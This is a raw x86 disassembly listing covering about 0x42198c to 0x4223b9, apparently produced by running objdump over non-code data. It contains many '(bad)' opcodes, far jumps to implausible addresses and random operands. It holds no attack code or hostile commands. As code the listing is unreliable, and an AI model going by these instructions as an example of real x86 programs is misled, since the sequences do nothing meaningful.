  42198c:	enter  0x1b9f,0x45
  421990:	mov    esi,0x0
	...
  4219f1:	add    BYTE PTR [eax],al
  4219f3:	add    dh,bh
  4219f5:	cld    
  4219f6:	je     0x421a15
  4219f8:	jbe    0x421997
  4219fa:	(bad)  
  4219fb:	(bad)  
  4219fc:	jns    0x4219ee
  4219fe:	sbb    al,0x7b
  421a00:	cmp    eax,0xb6327571
  421a05:	add    WORD PTR [eax],ax
  421a08:	add    eax,0xbf000001
  421a0d:	outs   dx,BYTE PTR ds:[esi]
  421a0e:	xor    BYTE PTR [ebx-0x5a1f8445],dl
  421a14:	cdq    
  421a15:	out    dx,eax
  421a16:	mov    ecx,0xadedbcf1
  421a1b:	jns    0x4219a7
  421a1d:	sub    DWORD PTR [ebx+eiz*8-0x70],ebx
  421a21:	ins    DWORD PTR es:[edi],dx
  421a22:	hlt    
  421a23:	int    0xca
  421a25:	pop    ebx
  421a26:	mov    ds:0xc0c8f16e,al
  421a2b:	pop    ds
  421a2c:	cmp    al,0x60
  421a2e:	in     eax,dx
  421a2f:	inc    DWORD PTR [edx+0x42]
  421a32:	mov    bl,0x3c
  421a34:	dec    edi
  421a35:	loop   0x421a15
  421a37:	leave  
  421a38:	loopne 0x421a92
  421a3a:	(bad)  
  421a3b:	fist   DWORD PTR [edi+edi*1-0x2e]
  421a3f:	jne    0x4219fd
  421a41:	xchg   esp,eax
  421a42:	lods   eax,DWORD PTR ds:[esi]
  421a43:	ja     0x421a5b
  421a45:	cmp    eax,0x1cece0a6
  421a4a:	das    
  421a4b:	or     ch,BYTE PTR [esp+ebx*1-0x6c731d45]
  421a52:	sub    edi,edi
  421a54:	xchg   DWORD PTR [esi+0x63719159],ebp
  421a5a:	xchg   edi,eax
  421a5b:	fwait
  421a5c:	xor    BYTE PTR [edi],al
  421a5e:	jmp    0x421a7d
  421a60:	jmp    FWORD PTR [ebx+0x153b9168]
  421a66:	lods   al,BYTE PTR ds:[esi]
  421a67:	shr    DWORD PTR [ebp+0x42],1
  421a6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a6b:	xor    al,0x5e
  421a6d:	mov    dl,0x76
  421a6f:	and    ebp,esp
  421a71:	ret    0x4676
  421a74:	inc    ecx
  421a75:	jno    0x4219fa
  421a77:	pop    edi
  421a78:	(bad)  
  421a79:	jmp    DWORD PTR [eax-0x37]
  421a7c:	jmp    0xd2ff:0x4426617
  421a83:	lds    ebx,FWORD PTR [ecx+ecx*8+0xd]
  421a87:	mov    cl,0xad
  421a89:	and    DWORD PTR gs:[ebx-0x5c],eax
  421a8d:	mov    ebp,0x32ec4377
  421a92:	(bad)  
  421a93:	out    dx,eax
  421a94:	pop    es
  421a95:	sub    edx,DWORD PTR [eax]
  421a97:	push   es
  421a98:	xchg   esp,eax
  421a99:	or     BYTE PTR [ecx-0x5be72b5c],bl
  421a9f:	outs   dx,BYTE PTR ds:[esi]
  421aa0:	inc    esp
  421aa1:	or     eax,0x4e73b0c4
  421aa6:	(bad)  
  421aa7:	push   ss
  421aa8:	outs   dx,BYTE PTR ds:[esi]
  421aa9:	in     al,0x49
  421aab:	xor    DWORD PTR [edi],esi
  421aad:	inc    BYTE PTR [eax]
  421aaf:	pop    es
  421ab0:	bound  edx,QWORD PTR [ecx]
  421ab2:	xor    eax,0xf18a7f6f
  421ab7:	xor    dh,BYTE PTR [esi-0x61]
  421aba:	aaa    
  421abb:	sahf   
  421abc:	jb     0x421b1b
  421abe:	xor    BYTE PTR [ebp+edi*1-0x3ac97b4],0xdd
  421ac6:	sbb    edi,ebx
  421ac8:	sbb    edx,edi
  421aca:	loop   0x421a56
  421acc:	mov    al,0xb4
  421ace:	push   eax
  421acf:	test   BYTE PTR [ebx+0x9519cbf],ah
  421ad5:	jl     0x421a88
  421ad7:	test   DWORD PTR [ebx+edx*8],eax
  421ada:	mov    esp,0x832601e1
  421adf:	or     eax,0x86a6ac8e
  421ae4:	lds    edx,FWORD PTR [esp+edi*2+0x4f691b98]
  421aeb:	and    eax,0x16547fde
  421af0:	stc    
  421af1:	inc    eax
  421af2:	(bad)  
  421af3:	outs   dx,DWORD PTR ds:[esi]
  421af4:	aas    
  421af5:	jbe    0x421b15
  421af7:	loop   0x421aa9
  421af9:	shl    BYTE PTR [eax+ebp*1+0x2f],cl
  421afd:	std    
  421afe:	cmp    edx,esi
  421b00:	(bad)  [ebp-0x1e38e6d9]
  421b06:	in     al,dx
  421b07:	sti    
  421b08:	or     BYTE PTR [edi-0x32f59f83],0xb0
  421b0f:	pusha  
  421b10:	mov    ds:0x0,al
	...
  421b71:	add    BYTE PTR [eax],al
  421b73:	add    BYTE PTR [esi],dl
  421b75:	cdq    
  421b76:	jmp    0x37400b48
  421b7b:	fild   DWORD PTR [ecx+eax*8+0x28]
  421b7f:	or     bl,BYTE PTR ds:0xbb47ed37
  421b85:	add    DWORD PTR [bx+si],eax
  421b88:	add    eax,0x1b000001
  421b8d:	jp     0x421bff
  421b8f:	je     0x421b33
  421b91:	cs push es
  421b93:	loop   0x421ba7
  421b95:	cmc    
  421b96:	shr    bh,0x54
  421b99:	les    edi,FWORD PTR [eax-0x6c]
  421b9c:	inc    esp
  421b9d:	enter  0xa86e,0x79
  421ba1:	xchg   ecx,eax
  421ba2:	dec    ebx
  421ba3:	dec    edx
  421ba4:	inc    esi
  421ba5:	rcl    bh,cl
  421ba7:	inc    eax
  421ba8:	leave  
  421ba9:	sbb    eax,DWORD PTR [edx-0xbf7cd20]
  421baf:	hlt    
  421bb0:	push   cs
  421bb1:	xchg   ebx,eax
  421bb2:	cmp    bh,BYTE PTR [ebx-0x7a3fd2f0]
  421bb8:	nop
  421bb9:	loope  0x421bb3
  421bbb:	sbb    eax,0xf94ebc6a
  421bc0:	popf   
  421bc1:	(bad)  
  421bc2:	push   DWORD PTR [ebx]
  421bc4:	call   0x71b0:0x6ab7da1d
  421bcb:	cmp    dl,al
  421bcd:	xchg   ebx,eax
  421bce:	das    
  421bcf:	lahf   
  421bd0:	adc    eax,ebx
  421bd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421bd3:	inc    ecx
  421bd4:	adc    DWORD PTR [edi-0x332c8172],0xfffffff9
  421bdb:	pusha  
  421bdc:	bound  esp,QWORD PTR [esi+edx*4-0x62]
  421be0:	sbb    ebp,edi
  421be2:	cmc    
  421be3:	js     0x421b6f
  421be5:	jnp    0x421b94
  421be7:	mov    WORD PTR [edx],cs
  421be9:	ins    BYTE PTR es:[edi],dx
  421bea:	(bad)  
  421beb:	neg    dl
  421bed:	mov    DWORD PTR [esi-0x56],edx
  421bf0:	xor    BYTE PTR [esi+0xc],dl
  421bf3:	push   ebp
  421bf4:	sbb    ecx,ecx
  421bf6:	xor    al,0x57
  421bf8:	pop    edx
  421bf9:	dec    edx
  421bfa:	mov    bl,0x42
  421bfc:	addr16 aam 0x53
  421bff:	iret   
  421c00:	shl    DWORD PTR [ecx-0xd6942e7],1
  421c06:	mov    BYTE PTR [eax],ch
  421c08:	ret    0x3a47
  421c0b:	nop
  421c0c:	sbb    BYTE PTR [ecx],bh
  421c0e:	add    BYTE PTR [esi-0x6bd8f13e],ch
  421c14:	icebp  
  421c15:	fs cdq 
  421c17:	retf   
  421c18:	dec    eax
  421c19:	mov    ebx,0x18990fa9
  421c1e:	test   ebp,0x1c50f0e7
  421c24:	rcr    DWORD PTR [ecx+0x4476177e],1
  421c2a:	adc    al,0x4a
  421c2c:	sti    
  421c2d:	(bad)  
  421c2e:	mov    ch,0x7f
  421c30:	mov    gs,WORD PTR [esp+esi*4]
  421c33:	(bad)  
  421c34:	fprem1 
  421c36:	and    eax,DWORD PTR [ebp-0x8]
  421c39:	ret    
  421c3a:	arpl   WORD PTR [eax+0x6e],bp
  421c3d:	cdq    
  421c3e:	mov    cl,0xcc
  421c40:	inc    DWORD PTR [edi+0x26]
  421c43:	stos   BYTE PTR es:[edi],al
  421c44:	jecxz  0x421c8f
  421c46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c47:	inc    ecx
  421c48:	mov    bh,0x32
  421c4a:	(bad)  
  421c4b:	ror    DWORD PTR [ecx],cl
  421c4d:	xor    BYTE PTR ss:[ebx-0x4987858a],0x8
  421c55:	cwde   
  421c56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c57:	mov    ds:0x898c6de,al
  421c5c:	jb     0x421cc8
  421c5e:	in     al,dx
  421c5f:	dec    edi
  421c60:	lds    esi,FWORD PTR [ebp+0x3bc917d1]
  421c66:	xor    BYTE PTR [esi+0x46],dh
  421c69:	inc    ecx
  421c6a:	sbb    ecx,esi
  421c6c:	or     ebx,DWORD PTR [ecx+0xf]
  421c6f:	in     al,dx
  421c70:	jns    0x421c9e
  421c72:	push   ebx
  421c73:	dec    ebx
  421c74:	jmp    0xd112832d
  421c79:	cld    
  421c7a:	lods   al,BYTE PTR ds:[esi]
  421c7b:	push   ecx
  421c7c:	mov    ebp,0x32924113
  421c81:	xchg   edx,eax
  421c82:	aaa    
  421c83:	and    eax,0x4d378168
  421c88:	cmc    
  421c89:	mov    bl,0x62
  421c8b:	jnp    0x421c2d
  421c8d:	enter  0xa37d,0xb6
	...
  421cf1:	add    BYTE PTR [eax],al
  421cf3:	add    BYTE PTR [eax-0x1a4a95],dh
  421cf9:	push   eax
  421cfb:	jg     0x421d51
  421cfd:	dec    edi
  421cfe:	xchg   edx,eax
  421cff:	dec    edi
  421d00:	adc    edx,ebp
  421d02:	std    
  421d03:	aad    0xc0
  421d05:	push   0x1050001
  421d0a:	add    BYTE PTR [eax],al
  421d0c:	sbb    eax,0xa5f272b5
  421d11:	ret    
  421d12:	cmp    bh,BYTE PTR cs:[edi]
  421d15:	lds    edx,FWORD PTR [esi-0xc]
  421d18:	sbb    al,0xca
  421d1a:	scas   eax,DWORD PTR es:[edi]
  421d1b:	arpl   WORD PTR [edx-0x3b],ax
  421d1e:	mov    ecx,0x9f59e5cb
  421d23:	push   es
  421d24:	and    al,BYTE PTR [esi-0x17bf90b4]
  421d2a:	mov    edi,0x15313b3a
  421d2f:	icebp  
  421d30:	push   edi
  421d31:	ja     0x421d0a
  421d33:	xlat   BYTE PTR ds:[ebx]
  421d34:	test   al,0x61
  421d36:	stos   DWORD PTR es:[edi],eax
  421d37:	mov    esp,0xfb3b758b
  421d3c:	mov    al,0x6
  421d3e:	push   ecx
  421d3f:	and    DWORD PTR [edx-0x1a],esi
  421d42:	rcr    BYTE PTR [eax+0x743700a0],1
  421d48:	push   0x4a
  421d4a:	jae    0x421d6b
  421d4c:	cli    
  421d4d:	xchg   ebp,eax
  421d4e:	out    0xd8,al
  421d50:	std    
  421d51:	inc    ebx
  421d52:	imul   ebp,DWORD PTR [edi+ecx*4],0x39
  421d56:	int    0xa9
  421d58:	(bad)  
  421d59:	cld    
  421d5a:	push   es
  421d5b:	ins    DWORD PTR es:[edi],dx
  421d5c:	dec    ecx
  421d5d:	in     eax,0x2a
  421d5f:	inc    edx
  421d60:	out    dx,eax
  421d61:	jbe    0x421dd8
  421d63:	jg     0x421d56
  421d65:	adc    BYTE PTR [esi],0xfd
  421d68:	sub    dh,BYTE PTR [ebx+0x73]
  421d6b:	sbb    edi,DWORD PTR [esi+0x48d50122]
  421d71:	or     eax,0xdaafc5f5
  421d76:	out    0x90,eax
  421d78:	dec    edx
  421d79:	xor    eax,0x748f5e61
  421d7e:	xor    ebx,DWORD PTR [ebp+0x2]
  421d81:	push   es
  421d82:	loopne 0x421d71
  421d84:	adc    BYTE PTR [eax],al
  421d86:	(bad)  
  421d87:	fcomp  st(7)
  421d89:	cmp    al,0x76
  421d8b:	inc    esi
  421d8c:	sbb    eax,0x3e9c1ea1
  421d91:	call   DWORD PTR [ecx+edi*4-0x4]
  421d95:	adc    eax,0x6e9d90a6
  421d9a:	push   0x7f
  421d9c:	mov    WORD PTR [eax+0xb1863ee],?
  421da2:	adc    eax,0x9f5b3ae4
  421da7:	fdiv   DWORD PTR [ebx]
  421da9:	adc    DWORD PTR [esi+0x4b2eba55],edi
  421daf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421db0:	clc    
  421db1:	inc    DWORD PTR [ebx+0x36]
  421db4:	mov    ah,0x2f
  421db7:	mov    ecx,0x4d55a636
  421dbc:	js     0x421d66
  421dbe:	dec    edi
  421dbf:	lds    edx,FWORD PTR [edx]
  421dc1:	cld    
  421dc2:	pop    eax
  421dc3:	add    ebx,DWORD PTR [esi-0x65]
  421dc6:	inc    ebx
  421dc7:	cli    
  421dc8:	pop    ds
  421dc9:	mov    BYTE PTR [esi+0x40],0x6a
  421dcd:	sbb    al,0x25
  421dcf:	minps  xmm4,xmm0
  421dd2:	ss mov ch,0x73
  421dd5:	jb     0x421dc5
  421dd7:	add    BYTE PTR [ecx],ah
  421dd9:	std    
  421dda:	cmp    BYTE PTR [ebx+0x6d75a444],0xc8
  421de1:	addr16 repnz push edx
  421de4:	sbb    BYTE PTR [ebx-0x62],0x58
  421de8:	cmp    eax,DWORD PTR [edi]
  421dea:	cmp    eax,0x7e4c84e1
  421def:	dec    eax
  421df0:	ins    BYTE PTR es:[edi],dx
  421df1:	cmp    eax,0x8e92732e
  421df6:	shr    dh,cl
  421df8:	jg     0x421dd3
  421dfa:	push   0x1de43e80
  421dff:	push   es
  421e00:	mov    edi,0xa379dfe8
  421e05:	sub    eax,0x6500b212
  421e0a:	mov    DWORD PTR [esp+edx*1-0xd],0x746b8d
	...
  421e72:	add    BYTE PTR [eax],al
  421e74:	iret   
  421e75:	mov    eax,ds:0xbf7f851b
  421e7a:	fucomip st,st(3)
  421e7c:	push   es
  421e7d:	ins    BYTE PTR es:[edi],dx
  421e7e:	xor    al,0xb9
  421e80:	xor    ecx,DWORD PTR [ebx-0x3]
  421e83:	rol    ch,cl
  421e85:	imul   eax,DWORD PTR [ecx],0x10500
  421e8b:	add    ah,bl
  421e8d:	pop    es
  421e8e:	or     DWORD PTR [edi-0x3b69562e],ebp
  421e94:	scas   eax,DWORD PTR es:[edi]
  421e95:	xchg   edi,eax
  421e96:	xor    bl,dl
  421e98:	mov    cl,0x6b
  421e9a:	(bad)  
  421e9b:	stos   DWORD PTR es:[edi],eax
  421e9c:	call   0x8c7fe5a3
  421ea1:	popa   
  421ea2:	into   
  421ea3:	ss (bad) 
  421ea5:	mov    ebp,0x68fb9000
  421eaa:	add    cl,cl
  421eac:	out    dx,al
  421ead:	and    al,0x2c
  421eaf:	hlt    
  421eb0:	mov    ds:0x626188a9,eax
  421eb5:	lock je 0x421f10
  421eb8:	ins    DWORD PTR es:[edi],dx
  421eb9:	iret   
  421eba:	sahf   
  421ebb:	jg     0x421eb8
  421ebd:	or     eax,0x3e50654b
  421ec2:	jnp    0x421ef5
  421ec4:	iret   
  421ec5:	jae    0x421edc
  421ec7:	mov    bl,0x7f
  421ec9:	and    dl,BYTE PTR [ebp+0x77]
  421ecc:	and    al,0x1
  421ece:	pop    ebx
  421ecf:	arpl   bp,bx
  421ed1:	xor    al,0x6d
  421ed3:	xchg   esp,eax
  421ed4:	push   ecx
  421ed5:	fstp   QWORD PTR [edx]
  421ed7:	mov    ch,0x19
  421ed9:	cs sbb DWORD PTR cs:[ecx-0x2d],0x3c
  421edf:	mov    bl,0x4d
  421ee1:	jecxz  0x421e97
  421ee3:	lods   al,BYTE PTR ds:[esi]
  421ee4:	fistp  DWORD PTR [edx+0x4a]
  421ee7:	or     eax,0xb32251f8
  421eec:	mov    esp,0x2b0e50dc
  421ef1:	adc    DWORD PTR ds:0x2aaf67b0,edx
  421ef7:	fisubr WORD PTR ds:0x4bd79a85
  421efd:	lods   eax,DWORD PTR ds:[esi]
  421efe:	ins    BYTE PTR es:[edi],dx
  421eff:	ror    esp,0xcd
  421f02:	ins    DWORD PTR es:[edi],dx
  421f03:	sti    
  421f04:	adc    cl,BYTE PTR [edi-0x49]
  421f07:	leave  
  421f08:	or     al,0x54
  421f0a:	xor    dl,ah
  421f0c:	retf   
  421f0d:	std    
  421f0e:	xor    al,0x5f
  421f10:	sbb    bl,dl
  421f12:	addr16 loop 0x421f19
  421f15:	mov    BYTE PTR [edx+edi*8],bl
  421f18:	(bad)  
  421f19:	sti    
  421f1a:	add    DWORD PTR [eax],eax
  421f1c:	pushf  
  421f1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f1e:	pop    ecx
  421f1f:	jge    0x421f39
  421f21:	mov    dl,0x40
  421f23:	popa   
  421f24:	int3   
  421f25:	outs   dx,DWORD PTR ds:[esi]
  421f26:	call   0xe8e0:0xa63cdd49
  421f2d:	sub    ecx,ebx
  421f2f:	test   BYTE PTR [eax],ch
  421f31:	in     eax,0xca
  421f33:	push   ecx
  421f34:	or     eax,DWORD PTR [edx]
  421f36:	sub    DWORD PTR ds:0x3f755c61,edi
  421f3c:	ror    BYTE PTR [ebp+0x4de8ce18],0xb1
  421f43:	mov    bl,0x94
  421f45:	repz or ebx,DWORD PTR [esp+edx*4]
  421f49:	add    BYTE PTR [edi],0xf1
  421f4c:	inc    si
  421f4e:	mov    ch,0x91
  421f50:	inc    esp
  421f51:	cmp    ecx,DWORD PTR [esi-0x58176223]
  421f57:	inc    ebx
  421f58:	xchg   esi,eax
  421f59:	addr16 jge 0x421f42
  421f5c:	bound  ebp,QWORD PTR [ebp+0x6d]
  421f5f:	dec    edx
  421f60:	dec    esp
  421f61:	adc    dl,cl
  421f63:	xor    al,BYTE PTR ds:0xf50cdedc
  421f69:	dec    DWORD PTR [esi+0x1]
  421f6c:	in     al,0xec
  421f6e:	sub    esi,DWORD PTR [edx-0x19]
  421f71:	push   esi
  421f72:	int3   
  421f73:	adc    al,dh
  421f75:	aad    0xd8
  421f77:	push   ecx
  421f78:	cmp    eax,0xf27f4690
  421f7d:	dec    ecx
  421f7e:	lock pop ebp
  421f80:	addr16 mov ds:0xd178,al
  421f84:	dec    ecx
  421f85:	ret    0x1cb6
  421f88:	jmp    0x421f39
  421f8a:	into   
  421f8b:	in     al,dx
  421f8c:	mov    eax,ds:0xbf09689f
	...
  421ff1:	add    BYTE PTR [eax],al
  421ff3:	add    BYTE PTR [ebx+0x6],ch
  421ff6:	(bad)  
  421ff7:	dec    edi
  421ff8:	out    dx,eax
  421ff9:	iret   
  421ffa:	jmp    0x422022
  421ffc:	aas    
  421ffd:	in     eax,dx
  421ffe:	push   es
  421fff:	lods   ax,WORD PTR ds:[esi]
  422001:	jb     0x42207a
  422003:	xor    eax,0x16aca
  422008:	add    eax,0xd9000001
  42200d:	ds xchg ebp,eax
  42200f:	sbb    dl,BYTE PTR [edi+0xfb26a2c]
  422015:	div    BYTE PTR [esi+ebx*8]
  422018:	outs   dx,DWORD PTR ds:[esi]
  422019:	shr    DWORD PTR [ebx-0x7e01acc9],0x6c
  422020:	retf   
  422021:	cmp    al,BYTE PTR [ebp-0x1c6dc44]
  422027:	scas   al,BYTE PTR es:[edi]
  422028:	mov    bl,0xa6
  42202a:	push   edx
  42202b:	fldenv [edx-0x5]
  42202e:	mov    ds:0x38ac0501,al
  422033:	hlt    
  422034:	test   al,0x2d
  422036:	fld    TBYTE PTR [esi-0x4d49fa30]
  42203c:	push   cs
  42203d:	inc    DWORD PTR [ebx+0xc]
  422040:	repnz and eax,0x529135b1
  422046:	into   
  422047:	xor    ecx,edi
  422049:	mov    ch,0x4d
  42204b:	paddw  mm4,QWORD PTR [edx]
  42204e:	out    dx,al
  42204f:	psubusw mm5,mm5
  422052:	mov    ah,0xcd
  422054:	xor    al,0x4d
  422056:	or     ecx,DWORD PTR [edx+0x71]
  422059:	xchg   ebp,eax
  42205a:	mov    ecx,0x39c3a24d
  42205f:	push   ecx
  422060:	in     al,0x79
  422062:	pop    ss
  422063:	add    DWORD PTR [esi-0xe],ebp
  422066:	rol    DWORD PTR [ebx-0x39],cl
  422069:	add    bh,0x62
  42206c:	mov    ah,0x1f
  42206e:	cdq    
  42206f:	sub    al,0xb5
  422071:	popf   
  422072:	mov    edi,0xc18348f3
  422077:	fdiv   QWORD PTR [eax+0xd3b01dc]
  42207d:	sar    eax,1
  42207f:	test   BYTE PTR [ecx-0x109abdc4],0x92
  422086:	fwait
  422087:	jl     0x4220d9
  422089:	imul   edx,DWORD PTR [edx+0x11125723],0x4119fbae
  422093:	icebp  
  422094:	(bad)  
  422095:	or     ebp,DWORD PTR [edx+esi*8-0x7f]
  422099:	ror    cl,0xc9
  42209c:	dec    ecx
  42209d:	fld    DWORD PTR [ecx-0x189acda3]
  4220a3:	mov    ebp,DWORD PTR [ecx]
  4220a5:	ret    
  4220a6:	jne    0x422084
  4220a8:	test   eax,0xfc039715
  4220ad:	hlt    
  4220ae:	pop    ebx
  4220af:	xchg   ebx,esp
  4220b1:	mov    ds:0x2cbf3885,al
  4220b6:	cmc    
  4220b7:	jno    0x4220bd
  4220b9:	scas   eax,DWORD PTR es:[edi]
  4220ba:	retf   0x946f
  4220bd:	mov    ah,0x13
  4220bf:	(bad)  
  4220c0:	pop    ds
  4220c1:	mov    al,ds:0x3e8d1cee
  4220c6:	adc    al,0x2b
  4220c8:	outs   dx,DWORD PTR ds:[esi]
  4220c9:	lock jmp 0xd2c69a88
  4220cf:	imul   edx,DWORD PTR [ecx],0x63
  4220d2:	test   eax,0xc46cf85f
  4220d7:	scas   eax,DWORD PTR es:[edi]
  4220d8:	xchg   esi,eax
  4220d9:	dec    edx
  4220da:	push   ds
  4220db:	sub    ebx,DWORD PTR [ecx]
  4220dd:	sub    al,0x9b
  4220df:	(bad)  
  4220e0:	out    dx,eax
  4220e1:	add    al,dh
  4220e3:	xchg   esp,eax
  4220e4:	dec    ebx
  4220e5:	enter  0xb091,0x5f
  4220e9:	popf   
  4220ea:	ins    BYTE PTR es:[edi],dx
  4220eb:	dec    esi
  4220ec:	mov    ecx,0xb0456735
  4220f1:	imul   ecx,DWORD PTR [ebp+0x1f2fdef7],0xffffffcc
  4220f8:	or     esp,edx
  4220fa:	inc    eax
  4220fb:	mov    ss,WORD PTR [esi+0x7dd593fa]
  422101:	dec    ecx
  422102:	xor    al,0xb6
  422104:	loopne 0x4220c5
  422106:	fdiv   QWORD PTR [edx]
  422108:	in     al,0x5d
  42210a:	int    0x91
  42210c:	add    ch,dh
  42210e:	out    0xb7,eax
  422110:	(bad)  
	...
  422171:	add    BYTE PTR [eax],al
  422173:	add    BYTE PTR [esi-0x284ae],ah
  422179:	std    
  42217a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217b:	pop    ebx
  42217c:	dec    edx
  42217d:	sub    al,0x42
  42217f:	sub    esi,DWORD PTR [ecx-0x306d7779]
  422185:	imul   eax,DWORD PTR [ecx],0x0
  422188:	add    eax,0xb000001
  42218d:	rcl    DWORD PTR [edi+0x1dff6708],0x28
  422194:	jecxz  0x42219c
  422196:	(bad)  
  422197:	in     al,dx
  422198:	test   al,0x1c
  42219a:	jae    0x4221f6
  42219c:	add    al,0x77
  42219e:	hlt    
  42219f:	push   ebx
  4221a0:	fisttp DWORD PTR [edi-0x5]
  4221a3:	dec    ebx
  4221a4:	dec    esi
  4221a5:	jne    0x4221ce
  4221a7:	xchg   ebx,eax
  4221a8:	sar    DWORD PTR [ecx],1
  4221aa:	pop    edi
  4221ab:	push   edi
  4221ac:	ss test eax,0xcbedde27
  4221b2:	inc    esi
  4221b3:	leave  
  4221b4:	(bad)  
  4221b5:	adc    cl,dh
  4221b7:	sbb    al,0x47
  4221b9:	shr    ebx,cl
  4221bb:	push   es
  4221bc:	repz and bx,WORD PTR [ebx+0x22c0ed2]
  4221c4:	push   DWORD PTR [esi+0x64]
  4221c7:	sub    ebp,DWORD PTR [ecx+ebp*1+0x791e9e8b]
  4221ce:	nop
  4221cf:	rcl    BYTE PTR [eax],1
  4221d1:	(bad)  
  4221d2:	lods   al,BYTE PTR ds:[esi]
  4221d3:	(bad)  
  4221d4:	out    dx,al
  4221d5:	je     0x4221b0
  4221d7:	(bad)  
  4221d8:	dec    ebx
  4221d9:	jl     0x4221b7
  4221db:	sbb    BYTE PTR [ecx],dl
  4221dd:	mov    ds:0x1de3a36b,eax
  4221e2:	lock jmp 0x4c31:0xd03054dd
  4221ea:	sti    
  4221eb:	pop    edi
  4221ec:	cmc    
  4221ed:	in     al,0xfe
  4221ef:	scas   al,BYTE PTR es:[edi]
  4221f0:	mov    bl,0x34
  4221f2:	aam    0x95
  4221f4:	(bad)  
  4221f7:	pop    ds
  4221f8:	or     DWORD PTR [esi],ebp
  4221fa:	bound  esp,QWORD PTR [ebx-0x50]
  4221fd:	mov    ch,ch
  4221ff:	jmp    0xb4359339
  422204:	clc    
  422205:	into   
  422206:	out    dx,al
  422207:	ds or  eax,0x7e0067a4
  42220d:	(bad)
  422210:	xchg   DWORD PTR [ebx-0x1c7d1e1c],ebx
  422216:	push   0x73064a54
  42221b:	sub    al,0xfa
  42221d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42221e:	xor    al,0xed
  422221:	mov    ecx,DWORD PTR [edx-0x6b05146f]
  422227:	enter  0x3826,0x50
  42222b:	scas   al,BYTE PTR es:[edi]
  42222c:	fs cwde 
  42222e:	mov    dh,BYTE PTR [ebx+0x1b]
  422231:	sahf   
  422232:	xchg   edi,eax
  422233:	imul   ebp,ebp,0x813a51d3
  422239:	xlat   BYTE PTR ds:[ebx]
  42223a:	pop    ss
  42223b:	leave  
  42223c:	pop    eax
  42223d:	scas   al,BYTE PTR es:[edi]
  42223e:	mov    bl,0x5b
  422240:	cmp    eax,0x5b05eced
  422245:	icebp  
  422246:	lds    eax,FWORD PTR [ecx+0x41d03ae7]
  42224c:	sub    edx,DWORD PTR [ebx]
  42224e:	mov    ds:0x5af290a9,al
  422253:	cs push ecx
  422255:	in     eax,dx
  422256:	add    al,0x72
  422258:	enter  0x700e,0x45
  42225c:	pop    esi
  42225d:	jle    0x4222b3
  42225f:	popf   
  422260:	inc    esi
  422261:	pop    ebx
  422262:	cdq    
  422263:	hlt    
  422264:	fsubr  QWORD PTR [ecx]
  422266:	inc    ecx
  422267:	outs   dx,BYTE PTR ds:[esi]
  422268:	cs push eax
  42226a:	mov    ebx,0x92201ef6
  42226f:	out    dx,ax
  422271:	dec    eax
  422272:	or     BYTE PTR [edx],dh
  422274:	leave  
  422275:	ret    
  422276:	sbb    DWORD PTR [edx],esp
  422278:	sub    eax,0xd439bcd1
  42227d:	test   BYTE PTR [edi+0x29],ch
  422280:	je     0x422278
  422282:	dec    edi
  422283:	or     eax,0x7ee11cb0
  422288:	xchg   ecx,eax
  422289:	mov    ah,0x39
  42228b:	xchg   BYTE PTR cs:[edx+0x2064b],ah
	...
  4222f2:	add    BYTE PTR [eax],al
  4222f4:	(bad)  
  4222f5:	in     eax,dx
  4222f6:	lods   eax,DWORD PTR ds:[esi]
  4222f7:	imul   edi
  4222f9:	neg    edi
  4222fb:	std    
  4222fc:	sub    ebx,DWORD PTR [ebp+0x71]
  4222ff:	dec    ecx
  422300:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422301:	js     0x422354
  422303:	xchg   edx,eax
  422304:	aam    0x6c
  422306:	add    DWORD PTR [eax],eax
  422308:	add    eax,0x6d000001
  42230d:	daa    
  42230e:	mov    ch,BYTE PTR [edx+0x10]
  422311:	cmp    ch,BYTE PTR [edx+0x5eb6345]
  422317:	inc    ebx
  422318:	lahf   
  422319:	jle    0x4222eb
  42231b:	comiss xmm5,DWORD PTR [ecx]
  42231e:	add    edx,DWORD PTR [esi+0x36]
  422321:	xchg   ebp,eax
  422322:	mov    esp,0x510a657c
  422327:	jmp    0x7cb5af01
  42232c:	stos   DWORD PTR es:[edi],eax
  42232d:	aam    0x9f
  42232f:	dec    edi
  422331:	ficom  WORD PTR [edi-0x4b52a024]
  422337:	lods   al,BYTE PTR ds:[esi]
  422338:	inc    eax
  422339:	aad    0xb3
  42233b:	mov    dh,0x9c
  42233d:	xchg   esi,eax
  42233e:	pop    ds
  42233f:	imul   eax,DWORD PTR [esi],0xffffffed
  422342:	jmp    0x7ff44d92
  422347:	inc    esp
  422348:	aas    
  422349:	jns    0x422358
  42234b:	push   ss
  42234c:	jmp    FWORD PTR [ecx+0x2730327c]
  422352:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422353:	popa   
  422354:	pop    esi
  422355:	fwait
  422356:	xchg   esp,eax
  422357:	and    al,0x3
  422359:	jns    0x422386
  42235b:	push   0x7
  42235d:	sbb    bl,BYTE PTR [eax+0x3cf9b939]
  422363:	les    ecx,FWORD PTR [esi+ebp*2-0x59]
  422367:	pop    esi
  422368:	adc    al,BYTE PTR [esi]
  42236a:	jno    0x4223e0
  42236c:	sahf   
  42236d:	dec    edi
  42236e:	ins    DWORD PTR es:[edi],dx
  42236f:	cmc    
  422370:	in     eax,dx
  422371:	lods   eax,DWORD PTR ds:[esi]
  422372:	aam    0x83
  422374:	jp     0x42236b
  422376:	lock test bh,0x66
  42237a:	fdivr  QWORD PTR [edi+0x57]
  42237d:	jmp    0x4223fe
  42237f:	(bad)  
  422380:	repnz cmp eax,0xb3c89338
  422386:	add    bl,0xab
  422389:	in     eax,dx
  42238a:	mov    edi,0x58a2fc3a
  42238f:	fisubr WORD PTR [eax+0x5a0bcffe]
  422395:	xchg   ebp,eax
  422396:	push   edi
  422397:	add    DWORD PTR [eax+0x7a],ecx
  42239a:	mov    eax,ds:0x6dffbe79
  42239f:	fidiv  DWORD PTR [esi+0x35104ae0]
  4223a5:	adc    eax,0xb8f36470
  4223aa:	mov    esp,0x1dc5fd91
  4223af:	fcomp  QWORD PTR [ebx+ecx*4+0x24]
  4223b3:	sub    eax,0xeb221146
  4223b8:	inc    eax
  4223b9:	jbe    0x422367
